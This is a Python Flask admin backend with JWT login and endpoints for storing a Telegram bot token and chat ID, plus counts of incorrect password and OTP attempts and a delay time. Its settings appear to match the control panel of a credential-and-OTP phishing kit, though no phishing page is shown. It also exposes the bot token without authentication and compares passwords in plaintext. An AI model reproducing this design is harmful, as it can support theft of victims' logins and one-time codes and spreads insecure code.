import json
import secrets
import string

from flask import Flask, config, jsonify, make_response, request
from flask_cors import CORS
from flask_jwt_extended import (JWTManager, create_access_token,
                                get_jwt_identity, jwt_required)

from database import Account, Config


def generate_random_key(length=32):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(alphabet) for _ in range(length))


random_key = generate_random_key()
app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = random_key
jwt = JWTManager(app)
CORS(app, supports_credentials=True)


def login(username: str, password: str):
    db_data = Account().get_info()
    db_username = db_data.get('username')
    db_password = db_data.get('password')
    if username == db_username and password == db_password:
        return True
    return False


@app.route('/api/login', methods=['POST'])
def login_route():
    data = request.json
    if not data:
        return jsonify({"msg": "???"}), 400

    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"msg": "???"}), 400

    if login(username, password):
        access_token = create_access_token(identity=username)
        return jsonify({"msg": "Đăng nhập thành công", "access_token": access_token}), 200
    else:
        return jsonify({"msg": "Sai mật khẩu"}), 401


@app.route('/protected', methods=['GET'])
@jwt_required()
def protected():
    id_admin = get_jwt_identity()
    return jsonify(logged_in_as=id_admin), 200


@app.route('/api/get-telegram-config')
def get_telegram_config():
    config = Config()
    telegram_config = config.get_info()
    try:
        api_token = telegram_config["api_token"]
        chat_id = telegram_config["chat_id"]
    except Exception as e:
        api_token = ""
        chat_id = ""
        print(e)
    return jsonify(status=200, api_token=api_token, chat_id=chat_id)


@app.route('/api/set-telegram-config', methods=["POST"])
@jwt_required()
def set_telegram_config():
    if request.json:
        api_token = request.json.get('api_token')
        chat_id = request.json.get('chat_id')
        old_data = Config().get_info()
        incorrect_password_attempts = int(
            old_data["incorrect_password_attempts"])
        incorrect_otp_attempts = int(old_data["incorrect_otp_attempts"])
        delay_time = int(old_data["delay_time"])
        Config().change_info(api_token, chat_id, incorrect_password_attempts,
                             incorrect_otp_attempts, delay_time)
        return jsonify({'status': 200}), 200
    else:
        return jsonify({'error': 'No JSON data provided'}), 400


@app.route('/api/get-website-config')
def get_website_config():
    config = Config().get_info()
    incorrect_password_attempts = config["incorrect_password_attempts"]
    incorrect_otp_attempts = config["incorrect_otp_attempts"]
    delay_time = config["delay_time"]
    return jsonify(incorrect_password_attempts=incorrect_password_attempts, incorrect_otp_attempts=incorrect_otp_attempts, delay_time=delay_time)


@app.route('/api/set-website-config', methods=["POST"])
@jwt_required()
def set_website_config():
    old_data = Config().get_info()
    api_token = old_data["api_token"]
    chat_id = old_data["chat_id"]
    if request.json:
        incorrect_password_attempts = request.json.get(
            'incorrect_password_attempts')
        incorrect_otp_attempts = request.json.get('incorrect_otp_attempts')
        delay_time = request.json.get('delay_time')
        Config().change_info(api_token, chat_id, incorrect_password_attempts,
                             incorrect_otp_attempts, delay_time)
        return jsonify({'status': 200}), 200
    else:
        return jsonify({'status': 400}), 400


@app.route('/api/get-state-login', methods=['GET'])
@jwt_required()
def get_state_login():
    return jsonify({'logged_in': True}), 200


@app.route('/api/logout', methods=["POST"])
@jwt_required()
def clear_access_token():
    response = make_response("Logout!")
    response.set_cookie('accessToken', '', expires=0)
    return response


if __name__ == '__main__':
    app.run(debug=True)
